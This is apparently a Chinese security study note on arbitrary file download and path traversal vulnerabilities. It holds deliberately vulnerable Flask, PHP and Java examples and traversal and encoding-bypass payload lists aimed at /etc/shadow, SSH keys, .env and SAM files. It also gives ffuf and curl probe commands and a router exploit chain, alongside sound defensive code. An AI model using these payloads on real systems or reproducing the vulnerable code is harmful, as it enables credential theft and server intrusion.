# 2026-08-07 文件下载漏洞详解

> 从原理到组合利用 — 一次搞清楚"任意文件读取"这个家族

## 知识框架速览

> 🧠 **[打开交互式思维导图](https://monney-sys.github.io/daily-learning/mindmaps/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.html)**（滚轮缩放 · 拖拽平移 · 点击折叠分支，新标签页打开）

下方正文按「原理 → 攻击手法 → 检测 → 利用 → 防御 → 广义视角」展开详述。

---

## 一、原理

### 1.1 什么情况会产生文件下载漏洞

Web 应用提供文件下载功能时，后端从用户请求中取文件名/路径 → 拼接 → 读文件 → 返回给浏览器。如果**这个路径没有做校验**，攻击者就能下到服务器上的任意文件。

```python
# 典型漏洞代码（Python Flask）
@app.route('/download')
def download():
    filename = request.args.get('file')          # 从用户请求中取值
    filepath = '/var/www/downloads/' + filename  # 直接拼接！
    return send_file(filepath)                   # 返回文件

# 正常请求：/download?file=report.pdf
#   → 下载 /var/www/downloads/report.pdf ✅
#
# 恶意请求：/download?file=../../../etc/passwd
#   → 下载 /var/www/downloads/../../../etc/passwd
#   → 实际路径 = /etc/passwd 💥
```

```php
// 典型漏洞代码（PHP）
$file = $_GET['file'];
$path = './uploads/' . $file;
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="' . basename($file) . '"');
readfile($path);  // 直接读文件 → 路径穿越 💥
```

```java
// 典型漏洞代码（Java Spring）
@GetMapping("/download")
public ResponseEntity<Resource> download(@RequestParam String fileName) {
    Path file = Paths.get("/var/files/").resolve(fileName); // resolve 不防穿越！
    Resource resource = new UrlResource(file.toUri());
    return ResponseEntity.ok().body(resource);  // 路径穿越 💥
}
```

### 1.2 本质

的核心原理：**用户控制了文件路径 → 路径拼接 → 遍历目录 → 读任意文件。**

```
用户输入 file=../../../etc/passwd
         │
         ▼
后端拼接: BASE_DIR + user_input
         │
         ▼
结果: /var/www/downloads/../../../etc/passwd
         │
         ▼
OS 解析为: /etc/passwd  ← 跳出了原本的目录！
```

**为什么 `../` 能生效？** 因为操作系统在处理路径时会把 `..` 解释为"上级目录"，后端只是把字符串拼在一起，没有检查最终路径是否超出了安全范围。

---

## 二、攻击手法详解

### 2.1 路径穿越（Directory Traversal）

最基础的手法，用 `../` 逐步跳出下载目录。

```bash
# Linux 靶场测试
?file=../../../etc/passwd           # 读系统用户文件
?file=../../../../etc/shadow        # 读密码哈希（需要 root 权限）
?file=../../../proc/self/environ    # 读当前进程环境变量
?file=../../../var/log/apache2/access.log  # 读 Web 日志

# Windows 靶场测试
?file=..\..\..\windows\win.ini     # 读 Windows 系统文件
?file=..\..\..\Windows\System32\drivers\etc\hosts  # hosts 文件
```

### 2.2 绝对路径直接指定

如果后端没拼接前缀或者校验不严，直接给绝对路径。

```bash
?file=/etc/passwd                   # Linux 绝对路径
?file=C:\Windows\win.ini            # Windows 绝对路径
```

### 2.3 编码绕过

当 WAF 或代码过滤了 `../` 时，用编码变形绕过。

```bash
# URL 编码
?file=..%2F..%2F..%2Fetc%2Fpasswd       # %2F = /
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd   # %2e = . , %2f = /
?file=..%252F..%252F..%252Fetc%252Fpasswd  # 二次编码（%25 = %）

# Unicode 变形
?file=..%c0%af..%c0%afetc/passwd       # %c0%af 在某些解析器中等价于 /
?file=..%c1%9c..%c1%9cetc/passwd       # 另一个 Unicode 等价变体

# 16 进制 / 8 进制（极少见，但理论上存在）
?file=..\x2f..\x2fetc/passwd
```

### 2.4 双写绕过

防护代码只做了一次"删除 `../`"的操作，却没有循环删除：

```bash
# 后端代码（有漏洞的过滤方式）：
# $path = str_replace('../', '', $user_input);

# 攻击者输入：
?file=....//....//....//etc/passwd
#         ↑   ↑
# 删除 ../ 后：../../etc/passwd  ← ../ 又被拼回来了！
```

### 2.5 截断绕过

#### %00 截断（PHP < 5.3.4）

PHP 底层用 C 语言实现，C 语言以 `\x00` 作为字符串结束符。当后端强制加后缀时可行：

```bash
# 后端：$path = '/var/files/' . $_GET['file'] . '.pdf';
# 目标读 /etc/passwd

?file=../../../etc/passwd%00    # %00 截断了后面的 .pdf
# PHP 读到：/var/files/../../../etc/passwd\x00.pdf
# C 层看：  /var/files/../../../etc/passwd  ← .pdf 被截掉了
```

#### 路径长度截断（PHP < 5.2.8）

某些老版本 PHP 路径最大长度 4096 字符。如果路径超长，末尾的后缀会被截断：

```bash
?file=../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././.  （不断重复 ./ 直到 4096 字符，把后缀 .pdf 挤掉）
```

### 2.6 手法速查表

| 手法 | Payload 示例 | 适用场景 |
|------|-------------|---------|
| 路径穿越 | `../../../etc/passwd` | 基础手法，无过滤 |
| 绝对路径 | `/etc/shadow` | 没拼前缀或校验不严 |
| URL 编码 | `..%2F..%2Fetc%2Fpasswd` | 黑名单过滤 `../` |
| 二次编码 | `..%252F..%252Fetc/passwd` | `%2F` 被解码后再过滤 |
| 双写 | `....//....//etc/passwd` | 只删除一次 `../` |
| %00 截断 | `../../../etc/passwd%00` | 后端强制加后缀（PHP < 5.3.4） |
| 长度截断 | `././././././` (4096+) | 后端强制加后缀（PHP < 5.2.8） |

---

## 三、检测方法

### 3.1 白盒审计

在代码中搜索以下**文件读取/下载函数**，然后追踪参数来源：

```python
# Python / Flask
send_file()
send_from_directory()
open()

# PHP
readfile()
file_get_contents()
fopen()
fread()
file()
highlight_file()   # 还能高亮源码
show_source()

# Java
Files.readAllBytes()
FileInputStream()
Paths.get().resolve()
new UrlResource()
```

### 3.2 黑盒测试

#### Step 1：识别下载入口

看这些特征：

```
URL 参数特征：?file= / ?path= / ?download= / ?read= / ?name= / ?filename=
URL 路径特征：/download/xxx  /static/xxx  /files/xxx  /attachment/xxx
页面功能特征：导出、附件下载、图片查看（?image=xxx.jpg）、备份下载
```

#### Step 2：用探针文件测试

```bash
# Linux 探针
?file=../../../etc/passwd       # 下载成功 → 漏洞确认

# Windows 探针
?file=..\..\..\windows\win.ini  # 下载成功 → 漏洞确认

# 如果下载失败，尝试编码绕过
?file=..%2F..%2F..%2Fetc%2Fpasswd
?file=....//....//....//etc/passwd
```

#### Step 3：自动化

```bash
# dirsearch 扫描常见下载路径
python dirsearch.py -u https://target.com -e php,asp,aspx -f

# ffuf 模糊测试参数
ffuf -u 'https://target.com/download?FUZZ=../../../etc/passwd' -w params.txt

# Burp Intruder 批量测试编码变体
```

### 3.3 通用 PoC

```bash
# Linux — 一步验证
curl 'https://target.com/download?file=../../../etc/passwd'

# Windows — 一步验证
curl 'https://target.com/download?file=..\..\..\windows\win.ini'

# 不确定 OS？两条都跑一遍
```

### 3.4 判断 OS 的小技巧

```bash
# Linux 路径特征：/etc/passwd、/proc/self/environ，后缀不区分大小写
# Windows 路径特征：C:\Windows\win.ini、\ 反斜杠，路径有盘符
# 响应头 Server 字段也可能暴露：Apache/2.4.41 (Ubuntu) vs Microsoft-IIS/10.0
```

---

## 四、利用场景

### 4.1 读取配置文件 → 拿数据库/API 凭据

这是最直接也最高危的利用方式。

```bash
# PHP 应用的常见配置文件
?file=../config.php                 # 数据库密码直接在源码里
?file=../.env                       # Laravel / Symfony 环境变量
?file=../config/database.yml        # Rails 数据库配置
?file=../WEB-INF/web.xml            # Java Web 配置入口

# Web 服务器配置
?file=../../../etc/apache2/sites-enabled/000-default.conf  # Apache 虚拟主机
?file=../../../etc/nginx/nginx.conf                        # Nginx 配置
?file=../../../etc/nginx/sites-enabled/default             # Nginx 站点配置
```

**拿到数据库密码后能做什么？**

```
配置文件中的明文密码 → 连接数据库 → 拖库 → 找管理员密码哈希 → 破解登录后台
                                                        → 写 webshell（如果有 file_priv 权限）
```

### 4.2 读取源码 → 白盒审计 → 找更多漏洞

```bash
# 下载当前 Web 应用的源码
?file=../index.php
?file=../admin/login.php
?file=../api/user.py
?file=../src/main/java/com/app/UserController.java

# 源码里可能藏着：
# - SQL 注入点（拼接 SQL 的代码）
# - 硬编码的密钥、Token
# - 未授权访问的 API 接口
# - 文件上传逻辑的缺陷
```

**源码泄露的价值**：黑盒测试只能猜，拿到源码就能做完整白盒审计，发现的漏洞数量和质量都会大幅提升。

### 4.3 读取系统文件

```bash
# Linux
?file=../../../etc/shadow              # ⚠️ 密码哈希（需 root 权限）
?file=../../../root/.ssh/id_rsa        # ⚠️ SSH 私钥
?file=../../../root/.bash_history      # 管理员操作历史（可能含密码）
?file=../../../etc/crontab             # 定时任务（可能含脚本路径）

# Windows
?file=..\..\..\Windows\System32\config\SAM     # ⚠️ 密码哈希数据库
?file=..\..\..\Windows\repair\SAM              # 备份的 SAM 文件
?file=..\..\..\Windows\System32\inetsrv\config\applicationHost.config  # IIS 配置
```

### 4.4 读取日志 → 找 Session / Token

```bash
# Web 日志中可能包含：
# - 用户的 Cookie / Session ID（登录态劫持）
# - API Token / JWT（出现在 URL 参数或请求头中）
# - 请求体中的密码（调试日志可能记录 POST 数据）

?file=../../../var/log/apache2/access.log     # Apache 访问日志
?file=../../../var/log/nginx/access.log       # Nginx 访问日志
?file=../runtime/logs/app.log                 # 应用自身日志（可能含更多敏感信息）
```

### 4.5 经典组合链

```
链 1（IoT 设备经典）：
  文件下载 → /etc/config/account → 明文 admin 密码 → 登录后台
  案例：小米路由器，下载配置文件拿到 root 密码哈希

链 2（Web 应用经典）：
  文件下载 → 源码泄露 → 白盒审计 → 找到 SQL 注入 / 文件上传 / 反序列化
  案例：某 CMS 下载接口 → 审计源码 → 发现后台任意文件上传 → Getshell

链 3（服务器经典）：
  文件下载 → SSH 私钥泄露 → 直接免密登录服务器

链 4（云环境）：
  文件下载 → 读 .env / 环境变量 → 拿到云服务 Access Key → 控制云资源
```

---

## 五、防御方案

### 5.1 开发层（根本防线）

#### 方案 A：文件 ID 映射（推荐）

**不暴露真实路径**，用户只知道文件 ID：

```python
# ✅ 最佳实践：用户只传入文件 ID，后端查表映射到真实路径
FILE_MAP = {
    '1': '/var/downloads/report_2026.pdf',
    '2': '/var/downloads/manual_v2.pdf',
    '3': '/var/downloads/contract_template.docx',
}

@app.route('/download')
def download():
    file_id = request.args.get('id')  # 用户只传 ID，不是路径
    filepath = FILE_MAP.get(file_id)
    if filepath is None:
        abort(404)                    # ID 不存在 → 拒绝
    return send_file(filepath)
```

**为什么这是最安全的？** 因为用户能控制的只有一个数字 ID，后面映射到哪个文件完全由服务端说了算，攻击者没有任何操作路径的空间。

#### 方案 B：白名单 + 路径规范化

如果必须让用户指定文件名（比如按文件名下载），需要做两道校验：

```python
import os
import re

SAFE_DIR = '/var/www/downloads/'

@app.route('/download')
def download():
    filename = request.args.get('file', '')

    # 第 1 道：白名单校验文件名格式（只允许字母、数字、下划线、点、短横线）
    if not re.match(r'^[\w\.\-]+$', filename):
        abort(403)  # 包含 ../ 或 / 等危险字符 → 直接拒绝

    # 第 2 道：解析真实路径 + 检查是否在安全目录内
    real_path = os.path.realpath(os.path.join(SAFE_DIR, filename))
    if not real_path.startswith(os.path.realpath(SAFE_DIR)):
        abort(403)  # 路径穿越 → 拒绝

    return send_file(real_path)
```

```php
// PHP 版本
$safe_dir = realpath('/var/www/downloads/');
$file = $_GET['file'] ?? '';

// 第 1 道：白名单文件名
if (!preg_match('/^[\w\.\-]+$/', $file)) {
    die('Forbidden');  // 非法字符
}

// 第 2 道：路径规范化 + 校验
$real_path = realpath($safe_dir . '/' . $file);
if ($real_path === false || strpos($real_path, $safe_dir) !== 0) {
    die('Forbidden');  // 路径穿越
}

header('Content-Type: application/octet-stream');
readfile($real_path);
```

```java
// Java Spring 版本
import java.nio.file.*;

@GetMapping("/download")
public ResponseEntity<Resource> download(@RequestParam String fileName) {
    // 第 1 道：白名单
    if (!fileName.matches("^[\\w\\.\\-]+$")) {
        return ResponseEntity.status(403).build();
    }

    Path safeDir = Paths.get("/var/www/downloads/").toRealPath();
    Path filePath = safeDir.resolve(fileName).toRealPath();  // toRealPath 会解析 ../

    // 第 2 道：确保还在安全目录内
    if (!filePath.startsWith(safeDir)) {
        return ResponseEntity.status(403).build();
    }

    Resource resource = new UrlResource(filePath.toUri());
    return ResponseEntity.ok().body(resource);
}
```

### 5.2 运行时防护

| 层面 | 措施 | 效果 |
|------|------|------|
| **WAF** | 拦截含 `../` `..\\` 及编码变体的请求 | 挡掉大部分自动化扫描 |
| **RASP** | 运行时监控 `readfile()`/`send_file()` 等危险函数的参数 | 白盒也挡不住时做最后兜底 |
| **容器隔离** | Web 容器只读目录挂载，敏感目录不映射进容器 | 即使有漏洞，读不到系统关键文件 |
| **最小权限** | Web 进程用户（`www-data`/`nginx`）不可读 `/etc/shadow`、SSH 私钥、日志目录 | 降低漏洞被利用后的影响 |
| **selinux / AppArmor** | 强制访问控制，限制进程能读哪些文件 | 路径穿越也读不了越权文件 |

### 5.3 管理面

```
1. 配置文件不存明文密码 → 用环境变量或密钥管理服务（Vault）
2. 密钥定期轮换 → 即使泄露一次，影响窗口也有限
3. SAST 接入 CI/CD → Semgrep/CodeQL 扫描文件读取函数的参数来源
4. 生产环境关闭调试信息 → 不暴露文件路径、框架版本
```

### 5.4 防御分层总览

```
第 1 层：代码层 — 文件 ID 映射或白名单 + realpath 校验
第 2 层：框架配置 — 限制静态资源目录，不要让路由匹配到文件系统路径
第 3 层：WAF — 拦截 ../ 等路径穿越 Payload
第 4 层：系统权限 — Web 进程最小权限 + selinux/AppArmor
第 5 层：CI/CD 门禁 — SAST 扫描文件读取函数的污点路径
```

---

## 六、文件下载 / 文件读取 / 文件包含 — 三者辨析

**这三者经常被混着叫，搞清楚区别对面试和实战都有帮助**：

| | 文件下载漏洞 | 文件读取漏洞 | 文件包含漏洞（LFI） |
|---|---|---|---|
| **入口函数** | `send_file()` `readfile()` | `file_get_contents()` `fopen()` | `include()` `require()` |
| **浏览器表现** | 弹出下载框 | 内容直接回显在页面 | 看情况（可能回显，可能执行） |
| **危害层级** | 读文件 | 读文件 | **读 + 执行代码**（PHP） |
| **关系** | 是"任意文件读取"的子类 | 是更宽泛的概念 | 是另一个独立的漏洞类型 |

### 其他能"读文件"的漏洞（横向对比）

| 漏洞 | 怎么读文件 | 一句话解释 |
|------|-----------|-----------|
| **LFI** | `include('../../../etc/passwd')` | PHP 的文件包含函数读文件 |
| **XXE** | XML 里声明 `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | 让 XML 解析器去读系统文件 |
| **SSRF** | `?url=file:///etc/passwd` | 利用服务器请求能力，file 协议读本地文件 |
| **SSTI** | 模板里 `{{ ''.__class__.__mro__[2].__subclasses__()... }}` 链式调用 read | 利用模板引擎能力调用文件读取函数 |
| **文件下载** | `?file=../../../etc/passwd` | 下载接口的路径穿越 |

> **一句话记**：文件下载是任意文件读取的一种实现方式。任何能让服务器读文件并返回给你的功能点，都要检查路径是否可控。

---

## 七、实战：小米路由器案例复盘

2021 年小米路由器 AX3600（开发版 ROM）被发现存在任意文件下载漏洞，攻击链路非常经典。

### 漏洞入口

```
http://192.168.31.1/api-third-party/download/extdisks../etc/config/account
```

路由器的下载 API 没有对路径做校验，`../` 跳出了原本的下载目录。

### 攻击步骤

```
Step 1：下载配置文件
  GET /api-third-party/download/extdisks../etc/config/account
  → 返回一个 JSON，里面包含 admin 用户的密码（经过简单编码/加密）

Step 2：解码密码
  编码方式可能是 base64 或简单的异或 → 解码得到明文
  → 用 admin + 明文密码登录路由器后台 (192.168.31.1)

Step 3：登录后台后
  → 开启 SSH → root shell → 完全控制路由器
  → DNS 劫持、流量监听、内网横向移动 ...
```

### 这个案例教会我们什么

1. **IoT 设备安全性普遍较差** — 很多路由器、摄像头、NAS 的 Web 管理界面存在路径穿越
2. **配置文件里常常存明文密码** — 特别是嵌入式设备，因为资源有限，不跑复杂的密钥管理
3. **文件下载漏洞经常是攻击链的第一步** — 它本身不直接 GetShell，但拿到了凭据就等于拿到了钥匙

---

## 八、总结

| 维度 | 核心认知 |
|------|---------|
| **原理** | 用户控制路径 → 路径拼接 → 目录穿越 → 读任意文件 |
| **攻击手法** | 路径穿越、绝对路径、URL 编码、双写、%00 截断、长度截断 |
| **检测** | 白盒搜文件读取函数 + 黑盒测 `../etc/passwd` + 自动化模糊测试 |
| **利用** | 读配置文件 → 拿密码 / 读源码 → 白盒审计 / 读系统文件 → 提权 / 组合利用 |
| **防御** | 文件 ID 映射（最优）+ 白名单 + realpath + WAF + 最小权限 |
| **与 LFI 区别** | 文件下载只读不执行，LFI 可以执行 PHP 代码（危害更大） |

---

### 关联笔记

- [文件包含漏洞详解](./2026-08-05-文件包含漏洞详解.md) — LFI 也能读任意文件，且能执行代码
- [CSRF 与 SSRF 漏洞详解](./2026-08-04-CSRF与SSRF漏洞详解.md) — SSRF + file:// 协议读本地文件
- [文件上传漏洞体系总览](./2026-07-31-文件上传漏洞.md) — 文件上传 + 文件包含 getshell 的联动
- [2026-07-27-高权限注入与跨库文件操作](./2026-07-27-高权限注入与跨库文件操作.md) — SQL 注入的 `load_file()` 也能读文件
- [RCE 远程代码/命令执行详解](./2026-08-05-RCE远程代码命令执行详解.md) — 读源码 → 发现 RCE 的常见路径

### 待实践

- [ ] Pikachu 任意文件下载关卡通关
- [ ] 用 `curl` 手动对本地靶场测试路径穿越的编码变体
- [ ] 找一个有下载功能的 CTF 题目，尝试读源码 → 审计 → 找其他漏洞
- [ ] 本地部署一个有文件下载功能的简单 Web 应用，对比修复前/后的代码差异

> ⚠️ 声明：以上技术仅用于授权靶场、CTF 竞赛和渗透测试授权目标，未经授权对他人系统进行文件读取属于违法行为。
